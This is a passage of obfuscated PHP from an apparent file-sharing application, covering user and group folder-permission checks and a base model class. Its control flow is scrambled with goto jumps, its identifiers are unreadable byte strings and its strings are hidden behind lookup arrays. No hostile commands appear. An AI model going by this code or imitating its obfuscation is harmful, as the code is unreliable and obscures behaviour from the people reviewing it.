Model($B¶Àš¸Öí[1117])->field($B¶Àš¸Öí[383])->where($FÓôİ¿¡Â¡)->getField($B¶Àš¸Öí[369], !0); $fß©å¢æö¦[] = $DŒğïƒ†ä›; } $this->where(array($B¶Àš¸Öí[383] => array($B¶Àš¸Öí[384], $fß©å¢æö¦)))->delete(); return !0; } public function get($E’ŸÖ’Üº©) { $f·ŸÜÃ˜¹É = $this->getSourceList(array($E’ŸÖ’Üº©), !0); return $f·ŸÜÃ˜¹É[0]; } public function getSourceList($CçÎáñŠŠ‰, $A©š²Ûó = false) { goto b‡Ší“ÏÔ; c›ØÊê¼”Î: if (!$A©š²Ûó) { $EÅæİ¾‡¢æ = array($BÃ«å‘‡ï“[383] => array($BÃ«å‘‡ï“[384], $CçÎáñŠŠ‰)); $A©š²Ûó = $a«ÈÉç¢¾->field($BÃ«å‘‡ï“[2255])->where($EÅæİ¾‡¢æ)->select(); $A©š²Ûó = array_to_keyvalue($A©š²Ûó, $BÃ«å‘‡ï“[369]); } $cáïõ´¼›ƒ = $CçÎáñŠŠ‰; foreach ($A©š²Ûó as $cÌ¥¿ÕÏáŒ => $AÒä‹ÑÕ·Ì) { $Eœäæé‰‡Ÿ = $a«ÈÉç¢¾->parentLevelArray($AÒä‹ÑÕ·Ì[$BÃ«å‘‡ï“[459]]); $cáïõ´¼›ƒ = array_merge($cáïõ´¼›ƒ, $Eœäæé‰‡Ÿ, array($cÌ¥¿ÕÏáŒ)); } goto fºœáŠ†¾; b‡Ší“ÏÔ: $BÃ«å‘‡ï“ =& $_SERVER[”Ì÷ñ­î¸]; if (!$CçÎáñŠŠ‰) { return array(); } $a«ÈÉç¢¾ = Model($BÃ«å‘‡ï“[1117]); goto c›ØÊê¼”Î; fºœáŠ†¾: $cáïõ´¼›ƒ = array_values(array_unique($cáïõ´¼›ƒ)); if (!$cáïõ´¼›ƒ) { return array(); } $C¤ÙÔ¡×‹À = $BÃ«å‘‡ï“[2256]; goto C„¤ÉöŸæ; BÚÕ§Ş¤Â¬: $fÚ²Ş‡Èñë = array(); foreach ($A©š²Ûó as $DÖÈ¶™ìñ½ => $F»ï¿‚÷»·) { $fÚ²Ş‡Èñë[$DÖÈ¶™ìñ½] = $this->makeSourceAuth($F»ï¿‚÷»·, $dÖÃ¿Ÿà…Õ); } return $fÚ²Ş‡Èñë; goto AíŸíõ¨ÜÈ; C„¤ÉöŸæ: $EÅæİ¾‡¢æ = array($BÃ«å‘‡ï“[383] => array($BÃ«å‘‡ï“[384], $cáïõ´¼›ƒ)); $dÖÃ¿Ÿà…Õ = $this->field($C¤ÙÔ¡×‹À)->where($EÅæİ¾‡¢æ)->select(); $dÖÃ¿Ÿà…Õ = array_to_keyvalue_group($dÖÃ¿Ÿà…Õ, $BÃ«å‘‡ï“[369]); goto BÚÕ§Ş¤Â¬; AíŸíõ¨ÜÈ: } public function authDeepCheck($a¸’Œ“ï£) { goto Dóãô¦Ôê; C¹à§à˜®‚: if (!in_array($a¸’Œ“ï£, $aÉªÚšª¹´[$AÅáƒˆÒÁ§[2257]])) { return !1; } $Eª¾“’„Šš = array(); foreach ($aÉªÚšª¹´[$AÅáƒˆÒÁ§[2258]] as $D×‚…ô“œ => $FÒ ùìöõè) { if (!in_array($a¸’Œ“ï£, $FÒ ùìöõè)) { continue; } $Eª¾“’„Šš[] = $D×‚…ô“œ; } goto DìÊªé¤¯Ÿ; DìÊªé¤¯Ÿ: $D¤°¢ë°ñó = $Eª¾“’„Šš ? $Eª¾“’„Šš[0] : $a¸’Œ“ï£; return array($AÅáƒˆÒÁ§[377] => -1, $AÅáƒˆÒÁ§[418] => array($AÅáƒˆÒÁ§[385] => $AÅáƒˆÒÁ§[1031], $AÅáƒˆÒÁ§[2112] => $AÅáƒˆÒÁ§[468], $AÅáƒˆÒÁ§[386] => LNG($AÅáƒˆÒÁ§[2259]), $AÅáƒˆÒÁ§[2124] => $AÅáƒˆÒÁ§[2260]), $AÅáƒˆÒÁ§[2261] => array($AÅáƒˆÒÁ§[388] => $AÅáƒˆÒÁ§[2262], $AÅáƒˆÒÁ§[75] => $D¤°¢ë°ñó)); goto c…½­†ŸˆÒ; Dóãô¦Ôê: $AÅáƒˆÒÁ§ =& $_SERVER[”Ì÷ñ­î¸]; if (_get($GLOBALS, $AÅáƒˆÒÁ§[457])) { return !1; } $aÉªÚšª¹´ = $this->makeAuthDeep(); goto C¹à§à˜®‚; c…½­†ŸˆÒ: } protected function makeAuthDeep() { goto f‰ƒãÖ†‚; FºË‡Š‘Ê: foreach ($BÜ–Ö­àÏ as $AŸõ‘ğ»“) { $cÉ‚àŞÄïä = $F–¿âã†Ë->getInfo($AŸõ‘ğ»“); $d’¿ÅÙÜ« = $A©ŸŒ§šÅ->parentLevelArray($cÉ‚àŞÄïä[$cÙ‡š¬å¿[459]]); $A¢±ÏÛëî¹ = array_merge($A¢±ÏÛëî¹, $d’¿ÅÙÜ«); } $A¢±ÏÛëî¹ = array_values(array_unique($A¢±ÏÛëî¹)); foreach ($A¢±ÏÛëî¹ as $AŸõ‘ğ»“) { $cÉ‚àŞÄïä = $F–¿âã†Ë->getInfo($AŸõ‘ğ»“); $EàÍ®Ğ¥¶˜[] = $cÉ‚àŞÄïä[$cÙ‡š¬å¿[391]][$cÙ‡š¬å¿[369]]; $eë¿Œ‚†íÑ[$AŸõ‘ğ»“] = $cÉ‚àŞÄïä[$cÙ‡š¬å¿[391]][$cÙ‡š¬å¿[369]]; $AÏ™ò¥÷Ä[$AŸõ‘ğ»“] = $A©ŸŒ§šÅ->parentLevelArray($cÉ‚àŞÄïä[$cÙ‡š¬å¿[459]]); } goto f™«¥ğ ¢Ú; f‰ƒãÖ†‚: $cÙ‡š¬å¿ =& $_SERVER[”Ì÷ñ­î¸]; static $FÎâÍñ’ô¹ = false; if ($FÎâÍñ’ô¹) { return $FÎâÍñ’ô¹; } goto AÖÎ¤»¿—Â; f™«¥ğ ¢Ú: foreach ($c†ËÏº­°˜ as $aÃ¬›ë³¬ => $c„¦Ï«œİ) { $cÍç±éĞ½à = $bšÔŞ›Î[$aÃ¬›ë³¬]; if (!$cÍç±éĞ½à || !$eë¿Œ‚†íÑ[$cÍç±éĞ½à]) { continue; } $bÆ Î»µ¯‡ = array(); foreach ($AÏ™ò¥÷Ä[$cÍç±éĞ½à] as $AŸõ‘ğ»“) { $bÆ Î»µ¯‡[] = $eë¿Œ‚†íÑ[$AŸõ‘ğ»“]; } $c†ËÏº­°˜[$aÃ¬›ë³¬] = array_merge($bÆ Î»µ¯‡, $c„¦Ï«œİ); } $EàÍ®Ğ¥¶˜ = array_values(array_unique($EàÍ®Ğ¥¶˜)); $FÎâÍñ’ô¹ = array($cÙ‡š¬å¿[2257] => $EàÍ®Ğ¥¶˜, $cÙ‡š¬å¿[2258] => $c†ËÏº­°˜); goto a‚ÃÓ„áèŒ; AÖÎ¤»¿—Â: $C«â²µ°„ = Model($cÙ‡š¬å¿[2263])->listData(); $EÂ¤®¥ì„ó = array(); foreach ($C«â²µ°„ as $a³…×„“ÔÊ) { if ($a³…×„“ÔÊ[$cÙ‡š¬å¿[376]] == 0 && $a³…×„“ÔÊ[$cÙ‡š¬å¿[2126]] == $cÙ‡š¬å¿[83]) { $EÂ¤®¥ì„ó[] = $a³…×„“ÔÊ[$cÙ‡š¬å¿[367]]; } } goto Fìê»›†÷; F±­Úø’èÏ: $a±Úì÷Ÿ³ö = array_to_keyvalue($fè¨÷íªÆƒ, $cÙ‡š¬å¿[33], $cÙ‡š¬å¿[369]); $EàÍ®Ğ¥¶˜ = array(); $A¢±ÏÛëî¹ = $féÚŠ’­Ö”; goto dãã°ºë¼Š; a‚ÃÓ„áèŒ: return $FÎâÍñ’ô¹; goto F§Œ…‹ëÒÍ; Fìê»›†÷: $féÚŠ’­Ö” = Session::get($cÙ‡š¬å¿[2218]); $féÚŠ’­Ö” = array_to_keyvalue($féÚŠ’­Ö”, $cÙ‡š¬å¿[33], $cÙ‡š¬å¿[2106]); $d…»…³âˆ¯ = array($cÙ‡š¬å¿[371] => SourceModel::TYPE_USER, $cÙ‡š¬å¿[456] => USER_ID); goto d¢×ˆ‰´ĞÙ; d®ˆò–ëÓ‡: $bšÔŞ›Î = array(); $eë¿Œ‚†íÑ = array(); $AÏ™ò¥÷Ä = array(); goto Dˆå‘ƒœÅ; dãã°ºë¼Š: $A©ŸŒ§šÅ = Model($cÙ‡š¬å¿[1117]); $F–¿âã†Ë = Model($cÙ‡š¬å¿[458]); $c†ËÏº­°˜ = array(); goto d®ˆò–ëÓ‡; d¢×ˆ‰´ĞÙ: if ($féÚŠ’­Ö”) { $d…»…³âˆ¯ = array(array($cÙ‡š¬å¿[371] => SourceModel::TYPE_USER, $cÙ‡š¬å¿[456] => USER_ID), array($cÙ‡š¬å¿[371] => SourceModel::TYPE_GROUP, $cÙ‡š¬å¿[456] => array($cÙ‡š¬å¿[384], $féÚŠ’­Ö”)), $cÙ‡š¬å¿[916] => $cÙ‡š¬å¿[2186]); } if ($EÂ¤®¥ì„ó) { $d…»…³âˆ¯ = array($d…»…³âˆ¯, $cÙ‡š¬å¿[2234] => array($cÙ‡š¬å¿[2264], $EÂ¤®¥ì„ó)); } $fè¨÷íªÆƒ = $this->field($cÙ‡š¬å¿[2265])->where($d…»…³âˆ¯)->select(); goto F±­Úø’èÏ; Dˆå‘ƒœÅ: if ($a±Úì÷Ÿ³ö) { $EºÅŒÚïßÏ = $A©ŸŒ§šÅ->where(array($cÙ‡š¬å¿[369] => array($cÙ‡š¬å¿[384], $a±Úì÷Ÿ³ö)))->select(); foreach ($EºÅŒÚïßÏ as $e©œ»´íöÂ) { $d’¿ÅÙÜ« = $A©ŸŒ§šÅ->parentLevelArray($e©œ»´íöÂ[$cÙ‡š¬å¿[459]]); $EàÍ®Ğ¥¶˜ = array_merge($EàÍ®Ğ¥¶˜, $d’¿ÅÙÜ«); $A¢±ÏÛëî¹[] = $e©œ»´íöÂ[$cÙ‡š¬å¿[456]]; $c†ËÏº­°˜[$e©œ»´íöÂ[$cÙ‡š¬å¿[369]]] = $d’¿ÅÙÜ«; $bšÔŞ›Î[$e©œ»´íöÂ[$cÙ‡š¬å¿[369]]] = $e©œ»´íöÂ[$cÙ‡š¬å¿[456]]; } } $A¢±ÏÛëî¹ = array_values(array_unique($A¢±ÏÛëî¹)); $BÜ–Ö­àÏ = $A¢±ÏÛëî¹; goto FºË‡Š‘Ê; F§Œ…‹ëÒÍ: } private function makeSourceAuth($eŞãèöİ¦Å, $A‡¡ùàëé) { goto Eá¹ŞÂœÖï; E±º¨ºº¸›: if (!$déÅó¼àÌ† && $eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[371]] == SourceModel::TYPE_GROUP) { $cˆĞºÇ«Ä = $eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[456]]; if (isset($Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä])) { $f ƒ¹¥öÓ = $Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä]; $D¿ê‘„¥î = Model($B¢‚Ğ‹ø¾‘[458])->getInfo($cˆĞºÇ«Ä); $déÅó¼àÌ† = array($B¢‚Ğ‹ø¾‘[2266] => intval($f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]][$B¢‚Ğ‹ø¾‘[376]]), $B¢‚Ğ‹ø¾‘[2267] => $f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]], $B¢‚Ğ‹ø¾‘[2261] => array($B¢‚Ğ‹ø¾‘[388] => $B¢‚Ğ‹ø¾‘[2271], $B¢‚Ğ‹ø¾‘[75] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[391]][$B¢‚Ğ‹ø¾‘[369]], $B¢‚Ğ‹ø¾‘[2270] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[463]])); return $déÅó¼àÌ†; } } if (!$déÅó¼àÌ† && $eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[371]] == SourceModel::TYPE_GROUP) { $D¿ê‘„¥î = Model($B¢‚Ğ‹ø¾‘[458])->getInfo($eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[456]]); $b¨Æ¶í÷“¡ = explode($B¢‚Ğ‹ø¾‘[47], trim($D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[459]], $B¢‚Ğ‹ø¾‘[47])); foreach ($b¨Æ¶í÷“¡ as $cˆĞºÇ«Ä) { if ($cˆĞºÇ«Ä == $B¢‚Ğ‹ø¾‘[468] || $cˆĞºÇ«Ä == $C²Æ¹ŒîæÑ) { continue; } if (!isset($Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä])) { continue; } $f ƒ¹¥öÓ = $Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä]; $déÅó¼àÌ† = array($B¢‚Ğ‹ø¾‘[2266] => intval($f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]][$B¢‚Ğ‹ø¾‘[376]]), $B¢‚Ğ‹ø¾‘[2267] => $f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]], $B¢‚Ğ‹ø¾‘[2261] => array($B¢‚Ğ‹ø¾‘[388] => $B¢‚Ğ‹ø¾‘[2268], $B¢‚Ğ‹ø¾‘[2269] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[391]][$B¢‚Ğ‹ø¾‘[369]], $B¢‚Ğ‹ø¾‘[2270] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[463]])); break; } } if ((!$déÅó¼àÌ† || $déÅó¼àÌ†[$B¢‚Ğ‹ø¾‘[377]] <= 0) && $eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[371]] == SourceModel::TYPE_GROUP) { $FğìôÎš‡Ù = $this->authDeepCheck($eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[369]]); if ($FğìôÎš‡Ù) { $déÅó¼àÌ† = $FğìôÎš‡Ù; } } goto AÃøÇ¤²¢…; Eá¹ŞÂœÖï: $B¢‚Ğ‹ø¾‘ =& $_SERVER[”Ì÷ñ­î¸]; $Bˆ˜ÕÕâ¥µ = Session::get($B¢‚Ğ‹ø¾‘[2218]); $Bˆ˜ÕÕâ¥µ = array_to_keyvalue($Bˆ˜ÕÕâ¥µ, $B¢‚Ğ‹ø¾‘[2106]); goto eµ«¼±†ôí; eµ«¼±†ôí: $C²Æ¹ŒîæÑ = $B¢‚Ğ‹ø¾‘[83]; $bñÅÉ½•­æ = Model($B¢‚Ğ‹ø¾‘[1117])->parentLevelArray($eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[459]]); $bñÅÉ½•­æ = array_merge(array($eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[369]]), array_reverse($bñÅÉ½•­æ)); goto C¸ù¥µ«Ö”; C¸ù¥µ«Ö”: if ($eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[371]] == SourceModel::TYPE_GROUP) { $cˆĞºÇ«Ä = $eŞãèöİ¦Å[$B¢‚Ğ‹ø¾‘[456]]; if (isset($Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä]) && !_get($GLOBALS, $B¢‚Ğ‹ø¾‘[457])) { $f ƒ¹¥öÓ = $Bˆ˜ÕÕâ¥µ[$cˆĞºÇ«Ä]; if (Model($B¢‚Ğ‹ø¾‘[2253])->authCheckRoot($f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]][$B¢‚Ğ‹ø¾‘[376]])) { $D¿ê‘„¥î = Model($B¢‚Ğ‹ø¾‘[458])->getInfo($cˆĞºÇ«Ä); $déÅó¼àÌ† = array($B¢‚Ğ‹ø¾‘[2266] => intval($f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]][$B¢‚Ğ‹ø¾‘[376]]), $B¢‚Ğ‹ø¾‘[2267] => $f ƒ¹¥öÓ[$B¢‚Ğ‹ø¾‘[376]], $B¢‚Ğ‹ø¾‘[2261] => array($B¢‚Ğ‹ø¾‘[388] => $B¢‚Ğ‹ø¾‘[2268], $B¢‚Ğ‹ø¾‘[2269] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[391]][$B¢‚Ğ‹ø¾‘[369]], $B¢‚Ğ‹ø¾‘[2270] => $D¿ê‘„¥î[$B¢‚Ğ‹ø¾‘[463]])); return $déÅó¼àÌ†; } } } $déÅó¼àÌ† = !1; foreach ($bñÅÉ½•­æ as $eöìŠë‘¼—) { if (!isset($A‡¡ùàëé[$eöìŠë‘¼—])) { continue; } $e¯•Ñ†ÏÉº = $this->authMake($A‡¡ùàëé[$eöìŠë‘¼—]); if ($e¯•Ñ†ÏÉº[$B¢‚Ğ‹ø¾‘[418]]) { $déÅó¼àÌ† = $e¯•Ñ†ÏÉº; break; } } goto E±º¨ºº¸›; AÃøÇ¤²¢…: return $déÅó¼àÌ†; goto dÈÜò°æÖ; dÈÜò°æÖ: } public function authOwnerApply($e¿ŞŸ„âó©) { goto Aã¢£Ï šÕ; cø·º›‡çÓ: $F»ëø¨çÇ = Model($AÀ ·åà›[1117])->parentLevelArray($e¿ŞŸ„âó©[$AÀ ·åà›[459]]); $F»ëø¨çÇ = array_merge(array($e¿ŞŸ„âó©[$AÀ ·åà›[369]]), array_reverse($F»ëø¨çÇ)); $BÃ±áÙæŞ = $AÀ ·åà›[2256]; goto Bã“Å¤´Î; F˜‘Ëè˜ç÷: $e¿ŞŸ„âó©[$AÀ ·åà›[376]][$AÀ ·åà›[2274]] = Model($AÀ ·åà›[474])->userListInfo($c¿“ŠÖ°’); return $e¿ŞŸ„âó©; goto D•˜àÂìÃŠ; Aã‘ÚáÅË½: $DÊ®‚½¢›Ñ = array(); $c¿“ŠÖ°’ = array(); foreach ($e­…„Ú¡ã© as $dÓ†×Ñš·Í => $Fíö«Ö) { $D•‹¿¹å¤ = $this->authFolderOwnerUser($Fíö«Ö); $DÊ®‚½¢›Ñ[$dÓ†×Ñš·Í] = $D•‹¿¹å¤; $c¿“ŠÖ°’ = array_merge($c¿“ŠÖ°’, $D•‹¿¹å¤[$AÀ ·åà›[535]]); if ($D•‹¿¹å¤[$AÀ ·åà›[2273]]) { break; } } goto d÷Ë§Øåø; Aã¢£Ï šÕ: $AÀ ·åà› =& $_SERVER[”Ì÷ñ­î¸]; if (empty($e¿ŞŸ„âó©[$AÀ ·åà›[376]]) || isset($e¿ŞŸ„âó©[$AÀ ·åà›[2272]]) && $e¿ŞŸ„âó©[$AÀ ·åà›[2272]]) { return $e¿ŞŸ„âó©; } if (AuthModel::authCheckRoot($e¿ŞŸ„âó©[$AÀ ·åà›[376]][$AÀ ·åà›[377]])) { return $e¿ŞŸ„âó©; } goto cø·º›‡çÓ; Bã“Å¤´Î: $cËäğíÜ“£ = array($AÀ ·åà›[383] => array($AÀ ·åà›[384], $F»ëø¨çÇ)); $e­…„Ú¡ã© = $this->field($BÃ±áÙæŞ)->where($cËäğíÜ“£)->select(); $e­…„Ú¡ã© = array_to_keyvalue_group($e­…„Ú¡ã©, $AÀ ·åà›[369]); goto Aã‘ÚáÅË½; d÷Ë§Øåø: if (count($c¿“ŠÖ°’) == 0) { $c¿“ŠÖ°’ = $this->authFolderOwnerGroup($e¿ŞŸ„âó©[$AÀ ·åà›[456]]); } $c¿“ŠÖ°’ = array_unique($c¿“ŠÖ°’); if (AuthModel::authCheckRoot($e¿ŞŸ„âó©[$AÀ ·åà›[376]][$AÀ ·åà›[377]])) { $c¿“ŠÖ°’[] = USER_ID; } goto F˜‘Ëè˜ç÷; D•˜àÂìÃŠ: } private function authFolderOwnerGroup($bª‘©§†È) { $aáì‘ÙÛÆŒ =& $_SERVER[”Ì÷ñ­î¸]; $c¹ãÕÄË‡Á = Model($aáì‘ÙÛÆŒ[2180])->where(array($aáì‘ÙÛÆŒ[2106] => $bª‘©§†È))->select(); $fä’ªäÇã = array(); if (!$c¹ãÕÄË‡Á) { return $fä’ªäÇã; } foreach ($c¹ãÕÄË‡Á as $bÃ¬»Ñ¥øÂ) { $D†´Ô„ŠŠƒ = $this->authInfo($bÃ¬»Ñ¥øÂ); if (AuthModel::authCheckRoot($D†´Ô„ŠŠƒ[$aáì‘ÙÛÆŒ[376]])) { $fä’ªäÇã[] = $bÃ¬»Ñ¥øÂ[$aáì‘ÙÛÆŒ[1439]]; } } return $fä’ªäÇã; } private function authFolderOwnerUser($eæœëšù‹Ö) { $cñ®éËÀ =& $_SERVER[”Ì÷ñ­î¸]; $cƒÆƒÚ¢³ = array(); $E¤£«÷š = !1; foreach ($eæœëšù‹Ö as $eÅåô«å„‹) { $E†ó‘æÆ×Ï = $this->authInfo($eÅåô«å„‹); if ($eÅåô«å„‹[$cñ®éËÀ[456]] == $cñ®éËÀ[468]) { $E¤£«÷š = !0; } if ($eÅåô«å„‹[$cñ®éËÀ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($E†ó‘æÆ×Ï[$cñ®éËÀ[376]])) { $cƒÆƒÚ¢³[] = $eÅåô«å„‹[$cñ®éËÀ[456]]; } } } return array($cñ®éËÀ[535] => $cƒÆƒÚ¢³, $cñ®éËÀ[2273] => $E¤£«÷š); } public function authMake($b‚ô´“åÛê) { goto EªÊ¢Ğ‘; CñÅº†Õ‚: $CÔØÊíŒ²š = 0; $DÙšÉ¥ìåÅ = 0; $Dä°´†ôçì = 0; goto a÷¸‡Û™çÎ; F¯óš½ : $F¶íÖ´Ø„¯ = array($AÃç”ò‘Ö[2266] => intval($BË·„ù´ğ), $AÃç”ò‘Ö[2267] => $dÙ¾Ë×­Ú±, $AÃç”ò‘Ö[2261] => array($AÃç”ò‘Ö[388] => $FÀÓØÄèÚ©, $AÃç”ò‘Ö[75] => $D²’¾¤¾[$AÃç”ò‘Ö[369]])); return $F¶íÖ´Ø„¯; goto Aˆç ÛÎâ§; Eº²¼¢ñÆÛ: $DŒ¶ÈëÎ‹— = array_to_keyvalue($f•ì‘‚İ¼, $AÃç”ò‘Ö[33], $AÃç”ò‘Ö[2106]); $FÈ×«Ğêò· = 0; $EÓ¶‘æ•ƒ = 0; goto CñÅº†Õ‚; a÷¸‡Û™çÎ: $e‘Áà¹¤¿ë = 0; $Fï¡ŠÒºá¢ = 0; $ešÛÜ±®³ = 0; goto fŠÕôÌ¹§…; EªÊ¢Ğ‘: $AÃç”ò‘Ö =& $_SERVER[”Ì÷ñ­î¸]; if (!$b‚ô´“åÛê) { return array($AÃç”ò‘Ö[377] => 0, $AÃç”ò‘Ö[418] => !1); } $f•ì‘‚İ¼ = Session::get($AÃç”ò‘Ö[2218]); goto Eº²¼¢ñÆÛ; Bğ¢õÍï§Ò: $BË·„ù´ğ = $Fï¡ŠÒºá¢ ? $FÈ×«Ğêò· : ($ešÛÜ±®³ ? $EÓ¶‘æ•ƒ : $CÔØÊíŒ²š); $dÙ¾Ë×­Ú± = $Fï¡ŠÒºá¢ ? $DÙšÉ¥ìåÅ : ($ešÛÜ±®³ ? $Dä°´†ôçì : $e‘Áà¹¤¿ë); $FÀÓØÄèÚ© = $Fï¡ŠÒºá¢ ? $AÃç”ò‘Ö[2275] : ($ešÛÜ±®³ ? $AÃç”ò‘Ö[2276] : ($cª¢óœ˜ˆ– ? $AÃç”ò‘Ö[2277] : $AÃç”ò‘Ö[361])); goto F¯óš½ ; fŠÕôÌ¹§…: $cª¢óœ˜ˆ– = 0; $D²’¾¤¾ = array($AÃç”ò‘Ö[369] => 0); foreach ($b‚ô´“åÛê as $D²’¾¤¾) { $dÙ¾Ë×­Ú± = $this->authInfo($D²’¾¤¾); $eî¡ãôÖÛ = $D²’¾¤¾[$AÃç”ò‘Ö[456]]; $aöÁÕÂÙò = intval($dÙ¾Ë×­Ú±[$AÃç”ò‘Ö[376]]); if ($D²’¾¤¾[$AÃç”ò‘Ö[371]] == SourceModel::TYPE_USER && $eî¡ãôÖÛ == USER_ID) { $Fï¡ŠÒºá¢ = !0; $DÙšÉ¥ìåÅ = $dÙ¾Ë×­Ú±; $FÈ×«Ğêò· = $aöÁÕÂÙò; } else { if ($D²’¾¤¾[$AÃç”ò‘Ö[371]] == SourceModel::TYPE_GROUP && in_array($eî¡ãôÖÛ, $DŒ¶ÈëÎ‹—)) { $ešÛÜ±®³ = !0; if ($aöÁÕÂÙò >= $EÓ¶‘æ•ƒ) { $EÓ¶‘æ•ƒ = $aöÁÕÂÙò; $Dä°´†ôçì = $dÙ¾Ë×­Ú±; } } else { if ($eî¡ãôÖÛ == $AÃç”ò‘Ö[468]) { $cª¢óœ˜ˆ– = !0; $e‘Áà¹¤¿ë = $dÙ¾Ë×­Ú±; $CÔØÊíŒ²š = $aöÁÕÂÙò; } } } } goto Bğ¢õÍï§Ò; Aˆç ÛÎâ§: } public function authTargetInfoMake($FË•¢ïÏğ‹) { goto A±±¶õ»ï…; c¨µ¨»ò¼›: return array($e»÷†Ÿ”…Ò[2278] => $e¶ÚÌ…Œ¡, $e»÷†Ÿ”…Ò[2270] => $eÇîÎ…‰›); goto A‚‡õ¢ºìÅ; aò¸â™’¥ˆ: foreach ($FË•¢ïÏğ‹ as $F‰àÒ‘â‹‰) { if ($F‰àÒ‘â‹‰[$e»÷†Ÿ”…Ò[371]] == SourceModel::TYPE_USER) { $e¶ÚÌ…Œ¡[] = intval($F‰àÒ‘â‹‰[$e»÷†Ÿ”…Ò[456]]); } else { if ($F‰àÒ‘â‹‰[$e»÷†Ÿ”…Ò[371]] == SourceModel::TYPE_GROUP) { $eÇîÎ…‰›[] = intval($F‰àÒ‘â‹‰[$e»÷†Ÿ”…Ò[456]]); } } } if ($e¶ÚÌ…Œ¡) { $e¶ÚÌ…Œ¡ = Model($e»÷†Ÿ”…Ò[474])->userListInfo($e¶ÚÌ…Œ¡); } if ($eÇîÎ…‰›) { $Báàœ†â†¬ = array($e»÷†Ÿ”…Ò[2178] => array($e»÷†Ÿ”…Ò[384], $eÇîÎ…‰›)); $eÇîÎ…‰› = Model($e»÷†Ÿ”…Ò[458])->field($e»÷†Ÿ”…Ò[2191])->where($Báàœ†â†¬)->select(); $eÇîÎ…‰› = array_to_keyvalue($eÇîÎ…‰›, $e»÷†Ÿ”…Ò[2106]); } goto c¨µ¨»ò¼›; A±±¶õ»ï…: $e»÷†Ÿ”…Ò =& $_SERVER[”Ì÷ñ­î¸]; $e¶ÚÌ…Œ¡ = array(); $eÇîÎ…‰› = array(); goto aò¸â™’¥ˆ; A‚‡õ¢ºìÅ: } private function authInfo($CÕâåí¤°) { $fá©£›­™æ =& $_SERVER[”Ì÷ñ­î¸]; if ($CÕâåí¤°[$fá©£›­™æ[2234]]) { $f—£‹‚ÄĞ‚ = Model($fá©£›­™æ[2253])->listData($CÕâåí¤°[$fá©£›­™æ[2234]]); if (!$f—£‹‚ÄĞ‚) { return !1; $F–á†ĞÂ”ì = Model($fá©£›­™æ[2253])->listData(); $E­ÁÊ„ÄÉÎ = array_filter_by_field($F–á†ĞÂ”ì, $fá©£›­™æ[376], $fá©£›­™æ[468]); return $E­ÁÊ„ÄÉÎ; } $E²›‹÷¥ÅÖ = array_field_key($f—£‹‚ÄĞ‚, array($fá©£›­™æ[367], $fá©£›­™æ[28], $fá©£›­™æ[376], $fá©£›­™æ[2124], $fá©£›­™æ[2127])); $E²›‹÷¥ÅÖ[$fá©£›­™æ[2279]] = $CÕâåí¤°; return $E²›‹÷¥ÅÖ; } else { return array($fá©£›­™æ[385] => 0, $fá©£›­™æ[2112] => $CÕâåí¤°[$fá©£›­™æ[2235]], $fá©£›­™æ[386] => $fá©£›­™æ[33], $fá©£›­™æ[2124] => $fá©£›­™æ[2280]); } } } goto c§Ü‚Úˆœ–; e£‘‡Á¬Ğ¢: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\124\x69\155\145", "\164\x69\155\x65", "\x69\156\163\145\x72\164\54\165\160\x64\141\x74\x65", "\146\x75\156\143\164\x69\x6f\x6e"), array("\x63\x72\145\141\x74\x65\124\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\x65\162\164", "\x66\x75\156\x63\x74\x69\x6f\x6e")); public function setDataAuto($a ¦íÕÚ¿®) { $this->dataAuto = $a ¦íÕÚ¿®; } public function __construct($CÇµñœò¢ = '', $a‚Ÿ‡–¦ğŠ = '', $fÉÕ “¿Á = '') { parent::__construct($CÇµñœò¢, $a‚Ÿ‡–¦ğŠ, $fÉÕ “¿Á); } public static function textEncode($b•¨Òó) { if (!$b•¨Òó) { return $b•¨Òó; } $bÀ‹Ò•´—Ç = json_encode($b•¨Òó); $bÀ‹Ò•´—Ç = preg_replace_callback($_SERVER[”Ì÷ñ­î¸][342], function ($f£ä½ÙÌ) { return addslashes($f£ä½ÙÌ[0]); }, $bÀ‹Ò•´—Ç); return json_decode($bÀ‹Ò•´—Ç); } public static function textDecode($e×°…¹İã) { $e„£Î†Š =& $_SERVER[”Ì÷ñ­î¸]; $cŒñÆ¯Ş£ = json_encode($e×°…¹İã); $cŒñÆ¯Ş£ = preg_replace_callback($e„£Î†Š[343], function ($B•‡ä½©Êö) { return $_SERVER[”Ì÷ñ­î¸][93]; }, $cŒñÆ¯Ş£); return json_decode($cŒñÆ¯Ş£); } protected $tableMeta = array(); protected function _beforeInsert(&$C“‹¿å¤°, $Aõ˜µõëï) { $f¨’â™öîá =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->checkDataAutoHas($f¨’â™öîá[344])) { return; } $this->dataBeforeFilter($C“‹¿å¤°, $f¨’â™öîá[344]); } protected function _beforeUpdate(&$dš¿¦ß, $d„‚Âš‰Ìõ) { $DºÀ†”ö´ñ =& $_SERVER[”Ì÷ñ­î¸]; if 